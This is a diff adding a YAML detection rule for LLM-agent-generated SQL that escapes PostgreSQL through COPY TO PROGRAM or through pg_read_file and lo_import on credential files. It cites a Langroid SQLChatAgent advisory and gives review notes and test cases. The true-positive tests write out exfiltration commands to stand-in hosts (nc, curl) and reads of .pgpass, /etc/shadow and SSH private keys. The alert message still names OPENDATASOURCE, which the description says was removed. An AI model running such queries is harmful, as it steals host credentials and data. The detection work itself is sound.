@@ -1,0 +1,232 @@
+title: "Agent-Generated SQL Reaches Outside the Database via COPY TO PROGRAM or a Server-Side File Read"
+id: ATR-2026-02703
+rule_version: 2
+status: experimental
+description: >
+  Detects SQL, produced by the model or carried in an agent event, that uses a
+  database engine's escape hatches into the host: PostgreSQL
+  `COPY ... TO PROGRAM '<cmd>'` (pipes a result set into a shell command), and
+  `pg_read_file` / `pg_read_binary_file` / `pg_stat_file` / `lo_import` called
+  on a path that traverses out of the data directory or names a credential
+  file. Mined from GHSA-pmch-g965-grmr (Langroid
+  SQLChatAgent), whose `_validate_query` blocklist stopped the obvious DML
+  verbs and missed the `pg_read_file` family entirely, turning a
+  natural-language question into an arbitrary server-side file read.
+  ATR already covers the ingest direction -- ATR-2026-01987 matches
+  `COPY ... FROM PROGRAM` and `INTO OUTFILE` -- but verified on the shipped
+  engine, the exfiltration direction (`COPY orders TO PROGRAM 'nc ...'`) and
+  the whole pg_read_file family match nothing.
+
+  ADVERSARIAL REVIEW 2026-08-24 -- THREE CORRECTIONS, ALL MEASURED. Sixteen
+  benign samples were run through the shipped engine against rule_version 1
+  across llm_input, llm_output, tool_call, tool_response and mcp_exchange.
+  ALL SIXTEEN FIRED. What changed:
+  (1) THE ABSOLUTE-PATH HANDLE WAS WRONG. Version 1 claimed an absolute path
+  separates attack from DBA work. It does not: members of pg_read_server_files
+  legitimately pass absolute paths, and pg_read_file('/var/log/postgresql/postgresql-16-main.log', 0, 200000)
+  and pg_stat_file('/etc/postgresql/16/main/postgresql.conf') are ordinary
+  operations that both fired. The handle is now the TARGET, not the shape:
+  a traversal, or a named credential file (.pgpass, .ssh/, /etc/passwd,
+  /etc/shadow, .aws/credentials, .env, authorized_keys, /proc/.../environ).
+  lo_import was narrowed the same way -- version 1 fired on the migration
+  SELECT lo_import('/opt/acme/assets/logo.png').
+  (2) TO PROGRAM NOW REQUIRES THE QUOTE THE SYNTAX REQUIRES. Version 1's
+  bare word-boundary form fired on every Windows install instruction of the
+  shape "copy the signed binary to Program Files/Acme/bin" -- six of the
+  sixteen benign samples, including a CI build log, a changelog, an Ansible
+  task and a Traditional Chinese deployment runbook. COPY ... TO PROGRAM is
+  always followed by a quoted command string, so requiring it costs no recall.
+  (3) THE OPENDATASOURCE ARM WAS REMOVED, NOT NARROWED. OPENDATASOURCE( is
+  ordinary T-SQL: it is how a DBA pulls a one-off extract from an Excel file
+  or another instance, and it is also the function a hardening checklist names
+  when telling you to switch Ad Hoc Distributed Queries off. Both fired. No
+  precision handle survives inspection: requiring an inline Password= does not
+  work, because Microsoft's own OPENDATASOURCE reference example is
+  'Data Source=Seattle1;User ID=MyUID;Password=MyPass'. An arm that cannot
+  separate the attack from the vendor's documentation of the feature is worse
+  than no arm, so SQL Server ad-hoc distributed queries are now a stated
+  non-goal of this rule.
+author: "ATR Community (GHSA sweep)"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: high
+
+references:
+  cwe:
+    - "CWE-89"
+    - "CWE-73"
+  owasp_llm:
+    - "LLM06:2025"
+  owasp_agentic:
+    - "ASI05:2026"
+  mitre_attack:
+    - "T1005 - Data from Local System"
+  mitre_atlas:
+    - "AML.T0057 - LLM Data Leakage"
+  external:
+    - "https://github.com/advisories/GHSA-pmch-g965-grmr"
+
+metadata_provenance:
+  cwe: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+  mitre_attack: human-reviewed
+  mitre_atlas: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 (accuracy, robustness and cybersecurity) requires protection against unauthorised access to data; this rule detects agent-generated SQL that reads host files or pipes query results into a shell command."
+      strength: primary
+    - article: "10"
+      context: "Article 10 (data and data governance) expects data handled by the system to stay within its governed scope; a COPY TO PROGRAM or pg_read_file call removes it from that scope."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MG.2.3"
+      context: "Server-side file access through model-generated SQL is an identified AI risk requiring an active runtime countermeasure; this rule implements it."
+      strength: primary
+    - subcategory: "MP.5.1"
+      context: "Cataloguing SQL blocklist bypass through non-DML file primitives as an AI-specific risk in the organizational risk register."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control) is operationalised by inspecting generated SQL for host-reaching primitives before execution."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is implemented through runtime detection of the escape-hatch query."
+      strength: secondary
+
+tags:
+  category: context-exfiltration
+  subcategory: sql-host-escape-primitive
+  scan_target: runtime
+  confidence: high
+
+agent_source:
+  type: llm_io
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?:\bcopy\b[^;\r\n]{0,40}\bto\s{1,4}program\s{0,4}["\x27]|\b(?:pg_(?:read_file|read_binary_file|stat_file)|lo_import)\s{0,3}\(\s{0,3}["\x27][^"\x27\r\n]{0,90}(?:\.\./|/etc/(?:passwd|shadow|sudoers|ssh/)|\.pgpass|\.ssh/|authorized_keys|/proc/[\w./]{0,24}environ|/root/|\.aws/credentials|\.env\b|\.git-credentials))'
+      description: "COPY ... TO PROGRAM followed by the quoted command string the syntax requires, or a pg_read_file/pg_stat_file/lo_import call whose path argument traverses or names a credential file. NARROWED by adversarial review 2026-08-24 -- see false_positives."
+  false_positives:
+    - "Routine DBA file access, relative or absolute: pg_read_file('pg_hba.conf'), pg_read_file('/var/log/postgresql/postgresql-16-main.log', 0, 200000), pg_stat_file('/etc/postgresql/16/main/postgresql.conf'), lo_import('/opt/acme/assets/logo.png'). Version 1 fired on the last three; the condition now requires a traversal or a named credential target."
+    - "SQL Server ad-hoc distributed queries. OPENDATASOURCE( is no longer matched at all -- see correction (3) in the description. Separating linked-server abuse from a legitimate ad-hoc extract needs configuration state (is Ad Hoc Distributed Queries even enabled, and who is the caller) that a content regex does not have."
+    - "KNOWN AND UNFIXABLE, MEASURED: security writing that quotes the payload verbatim still fires -- a GHSA write-up containing pg_read_file('/etc/passwd'), an incident postmortem containing COPY (SELECT * FROM invoices) TO PROGRAM 'curl -T - http://...', this rule's own description, and a pytest that asserts the validator REJECTS agent.run_sql(\"SELECT pg_read_file('/etc/passwd')\"). Four of the sixteen benign samples are in this class and all four still fire. A content rule cannot tell a quoted payload from the payload, which is why the response is alert-only. Prose that DISCUSSES the technique without the executable string is silent, and that was measured."
+    - "Any English, Chinese or shell instruction to copy something to a Program Files or program directory, because TO PROGRAM must be followed by the opening quote of the command string."
+    - "COPY ... FROM PROGRAM and SELECT ... INTO OUTFILE, which are matched by ATR-2026-01987 and deliberately left out here to avoid duplicate alerting on the ingest direction."
+    - "An ORM or migration file naming a column or function `lo_import` or `copy_to_program` without the call syntax and the required argument shape."
+
+response:
+  actions:
+    - alert
+  message_template: >
+    [ATR-2026-02703] Generated SQL uses a database escape hatch to reach the
+    host filesystem or a shell (COPY TO PROGRAM / pg_read_file on an absolute
+    path / lo_import / OPENDATASOURCE). Validate generated SQL with an
+    allowlist of statements, not a blocklist of verbs.
+
+confidence: 80
+
+test_cases:
+  true_positives:
+    - input: "COPY orders TO PROGRAM 'nc collector.example 9001' WITH (FORMAT csv);"
+      expected: triggered
+      description: "GHSA-pmch-g965-grmr direction -- a result set piped into a shell command on the database host"
+    - input: "COPY (SELECT * FROM users) TO PROGRAM 'curl -T - https://collector.example/u';"
+      expected: triggered
+      description: "Subquery variant of the same exfiltration primitive"
+    - input: "SELECT pg_read_file('/home/postgres/.pgpass', 0, 4000);"
+      expected: triggered
+      description: "Arbitrary server-side file read on an absolute path, the family the Langroid blocklist missed"
+    - input: "SELECT pg_read_binary_file('../../../etc/shadow');"
+      expected: triggered
+      description: "Traversal out of the data directory to a credential file -- same family, relative form"
+    - input: "SELECT lo_import('/home/postgres/.ssh/id_rsa');"
+      expected: triggered
+      description: "Large-object import used to read a private key off the database host"
+  true_negatives:
+    - input: "SELECT pg_read_file('pg_hba.conf');"
+      expected: not_triggered
+      description: "Ordinary DBA read resolved inside the data directory -- no absolute path"
+    - input: "COPY customers TO '/tmp/export.csv' WITH CSV HEADER;"
+      expected: not_triggered
+      description: "A plain file COPY with no PROGRAM clause"
+    - input: "Please copy the build output to the program directory before running the migration."
+      expected: not_triggered
+      description: "English prose containing copy, to and program with no SQL keyword sequence"
+    - input: "COPY staging.events FROM PROGRAM 'gzip -dc /var/feeds/events.gz' WITH (FORMAT csv);"
+      expected: not_triggered
+      description: "The ingest direction, already covered by ATR-2026-01987 and intentionally excluded here"
+    - input: "Installation, step 4: copy the signed binary to Program Files\\Acme\\bin and restart the AcmeAgent service."
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: Windows install documentation. FIRED version 1 -- \"to Program\" with no intervening article satisfied the old word-boundary form."
+    - input: "[build] msbuild finished\n[deploy] copy Release\\app.exe to Program Files (x86)\\Vendor\\App\n[deploy] ok"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: CI deployment log. FIRED version 1."
+    - input: "### Fixed\n- installer no longer tries to copy temp shims to program directories owned by another user"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: changelog entry. FIRED version 1."
+    - input: "\u90e8\u7f72\u6b65\u9a5f 3\uff1acopy build/agent.exe to Program Files\\PanOps\\bin\uff0c\u7136\u5f8c\u91cd\u555f\u670d\u52d9\u3002"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: Traditional Chinese deployment runbook. FIRED version 1."
+    - input: "make install will copy the wrapper to program search paths listed in $PATH; use PREFIX=/opt to override."
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: build-system documentation. FIRED version 1."
+    - input: "- name: copy the license blob to program data\n  ansible.windows.win_copy:\n    src: license.dat\n    dest: C:\\ProgramData\\Acme\\license.dat"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: Ansible deployment task. FIRED version 1."
+    - input: 'SELECT lo_import(''/srv/keys/deploy_id_rsa.pub'');'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: importing an SSH PUBLIC key. Fired the first version of the fix, which listed id_rsa as a secret target; the token was dropped because .ssh/ already covers the private-key case that matters."
+    - input: 'SELECT pg_read_file(''/opt/app/.envoy/bootstrap.yaml'');'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: a path beginning .env... that is not a .env file -- the word boundary holds."
+    - input: 'SELECT pg_stat_file(''/etc/hosts'');'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: an absolute /etc/ path that is not a credential file."
+    - input: 'SELECT pg_read_file(''conf.d/extra.conf'', 0, 4096);'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: a relative include read."
+    - input: 'The connector reads ~/.aws/credentials at startup; it never calls pg_read_file on it.'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: prose naming both the function and a credential path, with no call joining them."
+    - input: 'runbook: copy dist/service.jar to program lib dir then bounce the unit'
+      expected: not_triggered
+      description: "ADVERSARIAL round 2, 2026-08-24: another copy-to-program instruction, no quote after PROGRAM."
+    - input: "SELECT pg_read_file('/var/log/postgresql/postgresql-16-main.log', 0, 200000);  -- needs pg_read_server_files, granted to the on-call DBA role"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: a DBA reading the server log by absolute path. FIRED version 1 and disproves its absolute-path precision claim."
+    - input: "pg_stat_file('/etc/postgresql/16/main/postgresql.conf') returns size and mtime; superusers and members of pg_read_server_files may pass an absolute path."
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: PostgreSQL documentation prose. FIRED version 1."
+    - input: "-- migration 0042: seed the logo large object\nSELECT lo_import('/opt/acme/assets/logo.png') AS oid;"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: an ordinary migration calling lo_import on an absolute path. FIRED version 1."
+    - input: "SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0','Data Source=D:\\finance\\sales_q3.xlsx;Extended Properties=Excel 12.0')...[Sheet1$];"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: the standard Excel ad-hoc import, ordinary DBA work. FIRED version 1; the arm that matched it was removed."
+    - input: "SELECT * FROM OPENDATASOURCE('SQLNCLI','Data Source=Seattle1;User ID=MyUID;Password=MyPass').Northwind.dbo.Orders;"
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: the shape of Microsoft\u2019s own OPENDATASOURCE reference example, credentials and all. This is why that arm could not be rescued by requiring an inline password."
+    - input: "Hardening checklist item 7: set 'Ad Hoc Distributed Queries' to 0 so that OPENDATASOURCE() and OPENROWSET() cannot be used to reach another server."
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: security hardening guidance naming the function. FIRED version 1."
+    - input: "Detection note: the exfiltration direction is COPY ... TO PROGRAM. The ingest direction is COPY ... FROM PROGRAM. Both are superuser-only in a default install."
+      expected: not_triggered
+      description: "ADVERSARIAL 2026-08-24: security writing that names the technique without carrying an executable command string."
+
+evasion_tests:
+  - input: "copy  orders   to    program  'nc collector.example 9001'"
+    expected: triggered
+    bypass_technique: lowercase_and_whitespace_padding
+    notes: "Case is never distinguished by the engine and \\s{1,4} absorbs padded whitespace. A comment inserted between COPY and TO PROGRAM (`COPY /*x*/ orders TO PROGRAM`) is still covered by the 40-character bridge; a comment longer than that is a known gap."
